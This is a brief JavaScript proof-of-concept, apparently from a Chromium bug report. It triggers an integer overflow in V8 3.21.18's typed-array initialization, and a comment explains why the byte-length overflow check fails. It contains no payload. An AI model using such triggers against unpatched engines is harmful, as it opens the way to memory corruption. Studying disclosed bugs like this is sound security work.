// Owner: Pinkie Pie
// v8 version: 3.21.18, ia32
var hugetempl = {length: 0x24924925};
var huge = new Float64Array(hugetempl);

/*
   https://bugs.chromium.org/p/chromium/issues/detail?id=319117

   in src/runtime.cc, there are two ways to initialize typed array.
     1. Runtime_TypedArrayInitialize gets its size directly.
        (i.e., var typeArray = new Float64Array(10);)

     2. Runtime_TypedArrayInitializeFromArrayLike 
        (i.e., var typeArray = new Float64Array({length:10});

   In this case, Runtime_TypedArrayInitializeFromArrayLike is invoked.

   ....
   size_t element_size = 1;
   ArrayIdToTypeAndSize(..., &element_size); // elemsize is changed.
   ....
   size_t length = NumberToSize(isolate, *length_obj);
   size_t byte_length = length * element_size;
   if (byte_length < length) {  	     // Overflow
       return isolate->Throw(........);
   }
   ....

   With our PoC, {element_size: 8, length: 613566757, byte_length: 613566760 }.

   If code is replaced into below,
     - var hugetempl = {length: 0x24924925};
     + var hugetempl = {length: 0x24924920};
   then, {element_size: 8, length: 613566752, byte_length: 613566720}.
   Thus, it throws exception.

   As a result, the lack of multiplicative overflow will pass an overflow check routine.
*/
